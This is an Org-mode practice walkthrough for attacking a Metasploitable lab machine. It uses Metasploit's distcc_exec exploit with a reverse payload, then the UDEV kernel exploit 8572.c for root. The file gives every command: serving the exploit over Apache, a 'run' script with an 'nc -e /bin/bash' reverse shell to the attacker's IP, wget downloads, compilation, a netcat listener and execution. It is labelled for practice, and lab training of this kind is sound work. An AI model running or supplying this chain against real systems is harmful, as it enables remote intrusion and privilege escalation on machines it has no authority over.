#+title:Exploitation Documentation
#+description: This file is used to document various type of exploitation with msfconsole [practice purpose only]
#+author: Touhidul Shawan

* DistCC Daemon Command Execution
#+begin_SRC text
step by step guide to exploit *distcc command execution with privilege escalation
#+end_SRC
** Steps
1. Open a terminal [marked as *terminal1* ] & run *msfconsole*
    #+begin_src bash
    sudo msfconsole
    #+end_src
2. Search for *distcc*
    #+begin_src bash
    search distcc
    #+end_src
3. Select first one
    #+begin_src bash
    use exploit/unix/misc/distcc_exec
    #+end_src
    or
    #+begin_src bash
    use 0
    #+end_src
4. Show detailed options
    #+begin_src bash
    options
    #+end_src
5. Set RHOST which the target host [in our case it is metasploitable]
   + change *192.168.0.5* to your metasploitable machine ip
    #+begin_src bash
    set RHOST 192.168.0.5
    #+end_src
6. Change the payload
   + You can show all the payloads for current exploit by typing
     #+begin_src bash
     show payloads
     #+end_src
7. Select correct payload
     #+begin_src bash
     set payload cmd/unix/reverse
     #+end_src
8. Run the exploit
   you can type *run* or *exploit*
    #+begin_src bash
    run
    #+end_src
*Keep open that terminal1*

** Privilege Escalation of distcc command execution with Udev exploit
Open a new terminal or new tab on existing open terminal1 in your *Kali* linux
You can find exploit with *searchsploit*
#+begin_src bash
searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
#+end_src
We will use this exploit
#+begin_src text
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 -  | linux/local/8572.c
#+end_src
We will serve this *8572.c* file to compromised metasploitable machine
1. Start the *apache* server
    #+begin_src bash
    sudo systemctl start apache2
    #+end_src
2. Copy *8572.c* file to */var/www/html/ directory
    #+begin_src bash
    sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/
    #+end_src
3. This exploit will execute the */tmp/run* file on the target, so we need to make it
    #+begin_src bash
    sudo vi /var/www/html/run
    #+end_src
4. Paste this code on that run file
Replace *192.168.0.8* with your kali linux ip and *5555* port as your wish [where you want to get back the connection]
    #+begin_src bash
    #!/bin/bash
    nc 192.168.0.8 5555 -e /bin/bash
    #+end_src

5. Restart the apache server
    #+begin_src bash
    sudo systemctl restart apache2
    #+end_src

6. Now  go that terminal1 and download these two files
   [ Replace *192.168.0.8* with your kali linux ip ]
   #+begin_src bash
   wget http://192.168.0.8/run
   #+end_src
   #+begin_src bash
   wget http://192.168.0.8/8572.c
   #+end_src

7. Compiling the exploit[ *8572.c* ]
   #+begin_src bash
   gcc -o udev_exploit 8572.c
   #+end_src
8. Finding the PID
   #+begin_src bash
   cat /proc/net/netlink
   #+end_src
   #+begin_src text
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
def0e200 0   0      00000000 0        0        00000000 2
df857a00 4   0      00000000 0        0        00000000 2
df81b200 7   0      00000000 0        0        00000000 2
de326600 9   0      00000000 0        0        00000000 2
de804000 10  0      00000000 0        0        00000000 2
def0e600 15  0      00000000 0        0        00000000 2
df8f0000 15  2342   00000001 0        0        00000000 2
defa1400 16  0      00000000 0        0        00000000 2
e0027400 18  0      00000000 0        0        00000000 2
   #+end_src
-----
Here PID is
#+begin_src txt
2342
#+end_src

9. Start the *netcat* listener on new terminal in kali linux
   change this *5555* port according to the port number that you used in *run* file
   #+begin_src bash
   nc -lvp 5555
   #+end_src

10. Now run the exploit in terminal1
   #+begin_src bash
   ./udev_exploit 2342
   #+end_src

Go back to netcat listener terminal and see that you get connection back or not | if successful than type *whoami* to verify
